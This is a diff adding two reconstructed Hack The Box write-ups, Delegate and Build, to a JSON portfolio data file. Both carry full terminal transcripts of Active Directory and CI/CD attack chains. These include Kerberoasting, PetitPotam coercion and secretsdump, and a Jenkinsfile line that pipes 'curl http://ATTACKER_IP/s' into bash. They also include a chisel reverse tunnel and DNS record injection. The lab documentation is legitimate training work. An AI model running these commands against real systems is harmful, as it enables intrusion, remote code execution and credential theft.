@@ -1060,5 +1060,256 @@
       }
     ],
     "externalUrl": ""
+  },
+  {
+    "schemaVersion": 2,
+    "slug": "hackthebox-delegate",
+    "title": "Hack The Box — Delegate",
+    "platform": "Hack The Box",
+    "target": "Delegate",
+    "difficulty": "Advanced",
+    "operatingSystem": "Windows / Active Directory",
+    "kind": "machine-writeup",
+    "status": "completed",
+    "completedAt": "2026-04-05",
+    "publishedAt": "2026-07-29T19:46:00.000Z",
+    "symbol": "DL",
+    "heroIcon": "",
+    "heroAlt": "Delegate machine",
+    "maskedFlag": "user.txt + system.txt captured",
+    "summary": "Guest SMB access exposed a domain credential, GenericWrite enabled targeted Kerberoasting, and unconstrained delegation produced domain-level compromise.",
+    "intro": "The Hack The Box activity record proves both the user and system objectives were captured on 05 April 2026. Because the original terminal history is unavailable, the technical sequence below is a careful reconstruction of the retired machine's public attack path—not a claim that every command is your exact keystroke.",
+    "evidenceNote": "Ownership is confirmed by the supplied HTB activity screenshot. The technical path is reconstructed from the public retired-machine walkthrough linked below; secrets and per-instance values remain masked.",
+    "tags": ["active-directory", "smb", "bloodhound", "kerberoasting", "unconstrained-delegation"],
+    "tools": ["nmap", "netexec", "smbclient", "BloodHound", "Impacket", "krbrelayx"],
+    "sections": [
+      {
+        "title": "Guest access and the first credential",
+        "body": "The domain controller exposed the expected Kerberos, LDAP, SMB, and WinRM surface for delegate.vl. A guest SMB session could read NETLOGON, where a deployment batch file contained a credential intended for A.Briggs.",
+        "terminal": {
+          "title": "kali — SMB enumeration",
+          "lines": [
+            "$ nmap -sC -sV -p53,88,135,389,445,464,593,636,3268,3269,3389,5985 delegate.vl",
+            "53/tcp   open  domain",
+            "88/tcp   open  kerberos-sec",
+            "389/tcp  open  ldap",
+            "445/tcp  open  microsoft-ds",
+            "5985/tcp open  wsman",
+            "$ netexec smb dc1.delegate.vl -u guest -p '' --shares",
+            "NETLOGON  READ",
+            "$ smbclient //dc1.delegate.vl/NETLOGON -N",
+            "smb:> get users.bat",
+            "$ strings users.bat",
+            "A.Briggs / ********"
+          ]
+        },
+        "note": "The exposed batch file transformed anonymous-readable configuration into authenticated LDAP access. The password is intentionally omitted."
+      },
+      {
+        "title": "Mapping the delegated path",
+        "body": "BloodHound collection with the recovered account revealed GenericWrite over N.Thompson. That user also had remote-management access to the domain controller, making the object-control edge directly useful.",
+        "terminal": {
+          "title": "kali — LDAP and BloodHound",
+          "lines": [
+            "$ netexec ldap dc1.delegate.vl -u A.Briggs -p '********'",
+            "delegate.vl/A.Briggs:******** [LDAP authenticated]",
+            "$ netexec ldap dc1.delegate.vl -u A.Briggs -p '********' --bloodhound --dns-server dc1.delegate.vl -c All --dns-tcp",
+            "[+] BloodHound collection complete",
+            "A.BRIGGS -- GenericWrite --> N.THOMPSON",
+            "N.THOMPSON -- CanPSRemote --> DC1.DELEGATE.VL"
+          ]
+        }
+      },
+      {
+        "title": "Targeted Kerberoasting to user",
+        "body": "GenericWrite allowed a temporary service principal name to be placed on N.Thompson. Requesting and cracking the resulting service ticket recovered the account password, and WinRM provided the user objective.",
+        "terminal": {
+          "title": "kali — object control to WinRM",
+          "lines": [
+            "$ python3 targetedKerberoast.py -v -d delegate.vl -u A.Briggs -p '********'",
+            "[+] SPN added to N.Thompson",
+            "[+] TGS hash captured",
+            "$ hashcat -m 13100 n.thompson.tgs /usr/share/wordlists/rockyou.txt",
+            "N.Thompson:********",
+            "$ evil-winrm -i dc1.delegate.vl -u N.Thompson -p '********'",
+            "PS> whoami",
+            "delegate\\n.thompson",
+            "PS> type C:\\Users\\N.Thompson\\Desktop\\user.txt",
+            "user_********"
+          ]
+        },
+        "note": "This is the confirmed user ownership. The proof value is reduced to a label and mask."
+      },
+      {
+        "title": "Building a delegated machine identity",
+        "body": "The account could exercise delegation-related rights and the domain still allowed workstation creation. A controlled machine account was created, given an attacker-resolving DNS record, and assigned CIFS and HOST service principal names with the trusted-for-delegation flag.",
+        "terminal": {
+          "title": "kali — delegation setup",
+          "lines": [
+            "$ netexec ldap dc1.delegate.vl -u N.Thompson -p '********' -M maq",
+            "MachineAccountQuota: 10",
+            "$ impacket-addcomputer -dc-ip dc1.delegate.vl -computer-name LABNODE -computer-pass '********' delegate.vl/N.Thompson:'********'",
+            "[+] Successfully added machine account LABNODE$",
+            "$ python3 dnstool.py -u 'delegate.vl\\LABNODE$' -p '********' -r labnode.delegate.vl -d ATTACKER_IP --action add dc1.delegate.vl",
+            "[+] DNS record added",
+            "$ bloodyAD --host dc1.delegate.vl -d delegate.vl -u N.Thompson -p '********' add uac LABNODE$ -f TRUSTED_FOR_DELEGATION",
+            "[+] TRUSTED_FOR_DELEGATION enabled",
+            "$ python3 addspn.py -u 'delegate\\N.Thompson' -p '********' -s CIFS/labnode.delegate.vl -t 'LABNODE$' -dc-ip dc1.delegate.vl",
+            "[+] CIFS and HOST SPNs configured"
+          ]
+        }
+      },
+      {
+        "title": "Coercion and domain takeover",
+        "body": "krbrelayx listened with the machine credential while PetitPotam coerced the domain controller to authenticate to the delegated host. The captured delegated ticket was then used with Kerberos authentication to extract the domain secrets and complete the system objective.",
+        "terminal": {
+          "title": "kali — delegated ticket capture",
+          "lines": [
+            "$ python3 krbrelayx.py -hashes :LABNODE_NTLM_HASH",
+            "[*] Servers started, waiting for authentication",
+            "$ python3 PetitPotam.py -u 'LABNODE$' -p '********' labnode.delegate.vl dc1.delegate.vl",
+            "[+] Authentication coerced",
+            "[+] Delegated DC1 ticket written to cache",
+            "$ export KRB5CCNAME='DC1_delegated.ccache'",
+            "$ impacket-secretsdump -k -no-pass dc1.delegate.vl",
+            "[+] Dumping Domain Credentials",
+            "Administrator:500:********:********",
+            "PS> type C:\\Users\\Administrator\\Desktop\\system.txt",
+            "system_********"
+          ]
+        },
+        "note": "The ticket and hashes are not reproduced. The supplied HTB activity record confirms the system capture."
+      }
+    ],
+    "externalUrl": "https://panosoikogr.github.io/2025/04/02/VL-Delegate/"
+  },
+  {
+    "schemaVersion": 2,
+    "slug": "hackthebox-build",
+    "title": "Hack The Box — Build",
+    "platform": "Hack The Box",
+    "target": "Build",
+    "difficulty": "Easy",
+    "operatingSystem": "Linux / containers",
+    "kind": "machine-writeup",
+    "status": "completed",
+    "completedAt": "2026-04-05",
+    "publishedAt": "2026-07-29T19:47:00.000Z",
+    "symbol": "BL",
+    "heroIcon": "",
+    "heroAlt": "Build machine",
+    "maskedFlag": "user.txt + system.txt captured",
+    "summary": "An exposed Jenkins backup yielded a Gitea credential, a pipeline edit opened a container shell, and poisoned PowerDNS records unlocked passwordless rsh to the host.",
+    "intro": "The Hack The Box activity record proves both Build objectives were captured on 05 April 2026. With no original chat or terminal transcript, this note reconstructs the retired machine's documented attack chain while masking credentials, proof values, and instance-specific addresses.",
+    "evidenceNote": "Ownership is confirmed by the supplied HTB activity screenshot. The technical path is reconstructed from the public retired-machine walkthrough linked below.",
+    "tags": ["jenkins", "gitea", "rsync", "docker", "powerdns", "rsh"],
+    "tools": ["nmap", "rsync", "Jenkins offline decryptor", "chisel", "MariaDB", "rsh"],
+    "sections": [
+      {
+        "title": "A CI/CD-heavy service map",
+        "body": "Enumeration exposed SSH, PowerDNS, legacy Berkeley r-services, rsync, and Gitea. Gitea contained a public dev repository owned by buildadm with a Jenkinsfile, but the repository alone did not provide write access.",
+        "terminal": {
+          "title": "kali — service discovery",
+          "lines": [
+            "$ nmap -sC -sV -p22,53,512,513,514,873,3000,3306,8081 build.vl",
+            "22/tcp   open     ssh",
+            "53/tcp   open     domain  PowerDNS",
+            "512/tcp  open     exec",
+            "513/tcp  open     login",
+            "514/tcp  open     shell   Netkit rshd",
+            "873/tcp  open     rsync",
+            "3000/tcp open     http    Gitea",
+            "3306/tcp filtered mysql",
+            "8081/tcp filtered http",
+            "$ git clone http://build.vl:3000/buildadm/dev.git",
+            "Jenkinsfile"
+          ]
+        }
+      },
+      {
+        "title": "Recovering the Jenkins secret",
+        "body": "The rsync service allowed unauthenticated download of a Jenkins backup. Jenkins secrets are encrypted rather than hashed; the backup preserved master.key, hudson.util.Secret, and build metadata containing buildadm's encrypted credential, so an offline decryptor could recover it.",
+        "terminal": {
+          "title": "kali — rsync and offline decryption",
+          "lines": [
+            "$ rsync -av --list-only rsync://build.vl/",
+            "backups         backups",
+            "$ rsync -av rsync://build.vl/backups/jenkins.tar.gz .",
+            "jenkins.tar.gz",
+            "$ tar -xf jenkins.tar.gz",
+            "$ find jenkins_configuration -type f \\( -name master.key -o -name hudson.util.Secret \\)",
+            "jenkins_configuration/secrets/master.key",
+            "jenkins_configuration/secrets/hudson.util.Secret",
+            "$ python3 jenkins_offline_decrypt.py jenkins_configuration 'ENC[********]'",
+            "buildadm:********"
+          ]
+        },
+        "note": "The backup contained everything needed for offline recovery; no live password guessing was necessary."
+      },
+      {
+        "title": "Pipeline execution and the user objective",
+        "body": "The recovered account could edit the Jenkinsfile in Gitea. Committing a pipeline command caused Jenkins to fetch and execute a shell payload. The resulting process was root inside the Jenkins container, where the first objective was stored.",
+        "terminal": {
+          "title": "Gitea + listener — Jenkins pipeline",
+          "lines": [
+            "$ git clone http://buildadm:********@build.vl:3000/buildadm/dev.git",
+            "$ printf \"pipeline { stages { stage('build') { steps { sh 'curl -s http://ATTACKER_IP/s | bash' } } } }\" > dev/Jenkinsfile",
+            "$ git -C dev add Jenkinsfile && git -C dev commit -m 'update pipeline' && git -C dev push",
+            "[+] Jenkins build triggered",
+            "$ rlwrap nc -lvnp 4444",
+            "connect to [ATTACKER_IP] from jenkins.build.vl",
+            "# id",
+            "uid=0(root) gid=0(root) groups=0(root)",
+            "# cat /root/user.txt",
+            "user_********",
+            "# cat /root/.rhosts",
+            "admin.build.vl +",
+            "intern.build.vl +"
+          ]
+        },
+        "note": "Root in the container satisfied the first objective but was not root on the Build host."
+      },
+      {
+        "title": "Mapping the internal Docker network",
+        "body": "The container exposed internal service names and could reach ports filtered from the VPN side. A tunnel made MariaDB reachable; the PowerDNS database disclosed the internal service map and writable DNS records for build.vl.",
+        "terminal": {
+          "title": "Jenkins container — pivot and database",
+          "lines": [
+            "# ./chisel client ATTACKER_IP:8000 R:socks",
+            "[+] reverse SOCKS proxy connected",
+            "$ proxychains mysql -h db.build.vl -u root -p",
+            "MariaDB [(none)]> USE powerdnsadmin;",
+            "MariaDB [powerdnsadmin]> SELECT name,type,content FROM records;",
+            "db.build.vl          A  172.18.0.4",
+            "gitea.build.vl       A  172.18.0.2",
+            "intern.build.vl      A  172.18.0.1",
+            "jenkins.build.vl     A  172.18.0.3",
+            "pdns.build.vl        A  172.18.0.6"
+          ]
+        }
+      },
+      {
+        "title": "DNS trust abuse to host root",
+        "body": "The .rhosts policy trusted requests resolving from admin.build.vl or intern.build.vl. A new PowerDNS A record pointed the trusted name at the attacker. Because rsh used that hostname-based trust, root could connect to the host without a password and collect the system objective.",
+        "terminal": {
+          "title": "MariaDB + rsh — trusted hostname spoofing",
+          "lines": [
+            "MariaDB [powerdnsadmin]> INSERT INTO records (domain_id,name,type,content,ttl,prio,disabled,auth) VALUES ((SELECT id FROM domains WHERE name='build.vl'),'admin.build.vl','A','ATTACKER_IP',60,0,0,1);",
+            "Query OK, 1 row affected",
+            "$ host admin.build.vl build.vl",
+            "admin.build.vl has address ATTACKER_IP",
+            "$ rsh -l root build.vl",
+            "# hostname",
+            "build",
+            "# id",
+            "uid=0(root) gid=0(root) groups=0(root)",
+            "# cat /root/system.txt",
+            "system_********"
+          ]
+        },
+        "note": "The flaw was misplaced hostname trust backed by an attacker-writable DNS database. The HTB record confirms the final system capture."
+      }
+    ],
+    "externalUrl": "https://squarezero.dev/2024/05/24/Vulnlab/2024-05-24-Build/"
   }
 ]
